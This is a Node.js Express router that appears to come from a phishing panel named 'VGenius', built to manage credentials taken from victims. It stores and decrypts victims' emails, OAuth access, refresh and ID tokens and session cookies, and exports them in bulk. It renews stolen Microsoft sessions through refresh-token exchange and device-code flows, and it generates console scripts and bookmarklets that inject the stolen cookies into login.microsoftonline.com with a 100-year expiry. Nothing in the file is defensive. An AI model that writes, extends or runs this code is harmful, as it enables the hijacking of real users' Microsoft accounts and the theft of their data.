const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// ─── Get all tokens for user ────────────────────────────────────────
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];

    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }

    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);

    let tokens;
    try {
      const [t] = await db.query(query.replace('SELECT id,', 'SELECT id, tenant,'), params);
      tokens = t;
    } catch {
      const [t] = await db.query(query, params);
      tokens = t.map(t => ({ ...t, tenant: 'common' }));
    }

    const [countResult] = await db.query(
      'SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Get single token with decrypted data ───────────────────────────
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    };

    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Update token notes ─────────────────────────────────────────────
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query(
      'UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?',
      [notes || '', req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Soft delete token ──────────────────────────────────────────────
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Generate cookie script ─────────────────────────────────────────
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const cookies = decrypt(token.cookies_encrypted);

    if (!accessToken && !refreshToken && !cookies) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available' });
    }

    var scripts = {};
    scripts.console = generateConsoleScript(cookiesList);
    scripts.bookmarklet = generateBookmarklet(cookiesList);

    res.json({
      script: scripts.console,
      scripts: scripts,
      cookie_count: cookiesList.length,
      cookies: cookiesList,
      generated_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// ─── Parse cookie string into array of cookie objects ───────────────
function parseCookies(cookieString) {
  if (!cookieString) return [];
  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes and their values
      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower.startsWith('samesite=')) {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Store unique cookies by lowercase name - preserve domain if present
      seenNames[nameLower] = { name: name, value: value, domain: '' };
    }
  }

  // Convert object back to array
  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Console script for direct paste into browser console ────────────
function generateConsoleScript(cookies) {
  var cookieJson = JSON.stringify(cookies);

  // Calculate 100-year expiry
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var script = '(function() {\n';
  script += 'var cookies = ' + cookieJson + ';\n';
  script += 'var expStr = "' + expStr + '";\n';
  script += '\n';
  script += '// Set each cookie using document.cookie with 100-year expiry\n';
  script += 'for (var i = 0; i < cookies.length; i++) {\n';
  script += ' var c = cookies[i];\n';
  script += ' var cookieStr = c.name + "=" + encodeURIComponent(c.value)\n';
  script += ' + "; path=/"\n';
  script += ' + "; expires=" + expStr\n';
  script += ' + "; secure"\n';
  script += ' + "; samesite=none"\n';
  // Only add domain if specified
  if (c.domain && c.domain.trim() !== '') {
    script += ' + "; domain=" + c.domain';
  }
  script += ';\n';
  script += ' document.cookie = cookieStr;\n';
  script += '}\n';
  script += '\n';
  script += 'console.log("[VGenius] Injected " + cookies.length + " cookies with 100-year expiry");\n';
  script += '\n';
  script += '// Redirect after 3 seconds to trigger authentication\n';
  script += 'setTimeout(function() {\n';
  script += ' window.location.href = "https://login.microsoftonline.com/common/oauth2/authorize";\n';
  script += '}, 3000);\n';
  script += '})();';

  return script;
}

// ─── Bookmarklet for one-click cookie injection ─────────────────────
function generateBookmarklet(cookies) {
  var cookieJson = JSON.stringify(cookies);

  // Calculate 100-year expiry
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  // Build bookmarklet code matching competitor's exact format
  var bookmarklet = 'javascript:(function(){';
  bookmarklet += 'var cookies=' + cookieJson + ';';
  bookmarklet += 'var expStr="' + expStr + '";';
  bookmarklet += 'cookies.forEach(function(c){';
  bookmarklet += 'var domain=c.domain||".login.microsoftonline.com";';
  bookmarklet += 'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; expires="+expStr+"; secure; samesite=none";';
  bookmarklet += '});';
  bookmarklet += 'setTimeout(function(){';
  bookmarklet += 'window.location.href="https://login.microsoftonline.com/common/oauth2/authorize";';
  bookmarklet += '},3000);';
  bookmarklet += '})()';

  var script = '<!DOCTYPE html>\n<html>\n<head>\n';
  script += '<title>VGenius Cookie Injector</title>\n';
  script += '<style>\n';
  script += 'body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
  script += 'h1 { color: #00ccff; }\n';
  script += 'a { display: inline-block; padding: 15px 30px; background: #00ccff; color: #000; text-decoration: none; border-radius: 6px; font-weight: bold; }\n';
  script += 'a:hover { background: #00cca3; }\n';
  script += 'pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; color: #0f0; }\n';
  script += '</style>\n';
  script += '</head>\n<body>\n';
  script += '<h1>Cookie Injection Ready</h1>\n';
  script += '<p><strong>Instructions:</strong></p>\n';
  script += '<ol>\n';
  script += '<li>Navigate to <code>https://login.microsoftonline.com/common/oauth2/authorize</code></li>\n';
  script += '<li>Open browser console (F12)</li>\n';
  script += '<li>Paste the script below and press Enter</li>\n';
  script += '<li>OR drag the button to your bookmarks bar and click on the Microsoft login page</li>\n';
  script += '</ol>\n';
  script += '<h2>Bookmarklet Button:</h2>\n';
  script += '<div id="bookmarklet"></div>\n';
  script += '<h2>Console Script:</h2>\n';
  script += '<pre id="console-script"></pre>\n';
  script += '<script>\n';
  script += 'var bookmarklet = "' + bookmarklet.replace(/"/g, '\\"') + '";\n';
  script += 'var consoleScript = ' + JSON.stringify(generateConsoleScript(cookies)) + ';\n';
  script += 'var div = document.getElementById("bookmarklet");\n';
  script += 'div.innerHTML = \'<a href="\' + bookmarklet + \'">Inject Cookies & Login</a>\';\n';
  script += 'document.getElementById("console-script").textContent = consoleScript;\n';
  script += '</script>\n';
  script += '</body>\n</html>';

  return script;
}

// ─── Manual cookie renewal ──────────────────────────────────────────
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for renewal' });
    }

    // Use refresh token for direct renewal (no popup needed)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
        const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';
        // Use stored client_id if available, otherwise fall back to env
        const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
        const result = await cookieConverter.convertTokensToCookies(
          refreshToken, templateType, tokenTenant, null, tokenClientId
        );

        if (result.success && result.cookies) {
          const ttlHours = 24 * 365 * 100;
          const newAccessToken = result.access_token || accessToken;
          const newRefreshToken = result.new_refresh_token || refreshToken;

          await db.query(
            `UPDATE captured_tokens
             SET cookies_encrypted = ?, token_type = 'cookie',
                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
                 last_renewed = NOW(),
                 renewal_count = COALESCE(renewal_count, 0) + 1,
                 access_token_encrypted = ?, refresh_token_encrypted = ?
             WHERE id = ?`,
            [
              encrypt(result.cookies),
              ttlHours,
              encrypt(newAccessToken),
              encrypt(newRefreshToken),
              token.id
            ]
          );

          await db.query(
            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
          );

          return res.json({
            success: true,
            message: 'Session renewed successfully using refresh token',
            cookies: result.cookies,
            cookie_count: result.cookie_count
          });
        }
      } catch (refreshErr) {
        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
      }
    }

    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
    if (!token.link_id || token.token_type === 'cookie') {
      // Use the cookie converter as fallback
      const cookieConverter = require('../services/cookieconverter');
      const cookieResult = await cookieConverter.convertTokensToCookies(
        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.client_id || config.AZURE_CLIENT_ID
      );

      if (cookieResult.success && cookieResult.cookies) {
        const ttlHours = 24 * 365 * 100;
        await db.query(
          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
          [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
        );
        return res.json({
          success: true,
          message: 'Session renewed successfully',
          cookies: cookieResult.cookies,
          cookie_count: cookieResult.cookie_count
        });
      }
      return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
    }

    // Try device code flow only if we have a valid link_id
    const deviceProxy = require('../services/deviceproxy');
    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const jwtToken = require('jsonwebtoken').sign(
      { user_id: req.user.id, link_id: token.link_id },
      require('../config/env').JWT_SECRET,
      { expiresIn: '1h' }
    );

    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);

    if (result.user_code) {
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
        [token.id, req.user.id, result.user_code]
      );

      res.json({
        success: true,
        job_id: result.job_id,
        user_code: result.user_code,
        verification_uri: result.verification_uri,
        message: 'Renewal initiated. Complete authentication in the popup.',
        instructions: 'A popup will open. Enter the code and complete the Microsoft login.'
      });
    } else {
      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
    }
  } catch (err) {
    const errorMsg = err.message || err.toString() || 'Unknown error';
    console.error('[Tokens] Renewal error:', errorMsg);
    res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
  }
});

// ─── Get renewal history ────────────────────────────────────────────
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── One-shot console script for direct cookie injection ─────────────
router.get('/inject-script', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for injection' });
    }

    // Get cookies from token - require actual cookies only (no fallback)
    var cookiesList = [];
    var cookiesDecrypted = decrypt(token.cookies_encrypted);
    if (cookiesDecrypted) {
      cookiesList = parseCookies(cookiesDecrypted);
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available for injection' });
    }

    // Return console script directly
    res.type('application/javascript').send(generateConsoleScript(cookiesList));
  } catch (err) {
    console.error('[Tokens] Inject script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// ─── Manual cookie conversion from pasted access token ──────────────
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type } = req.body;

    if (!access_token) {
      return res.status(400).json({ error: 'Access token is required' });
    }

    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(
      access_token, template_type || 'office'
    );

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '100 years',
        instructions: 'Use the injector page to set cookies in your browser'
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Export tokens ──────────────────────────────────────────────────
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Export and delete all ──────────────────────────────────────────
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));

    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: true
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
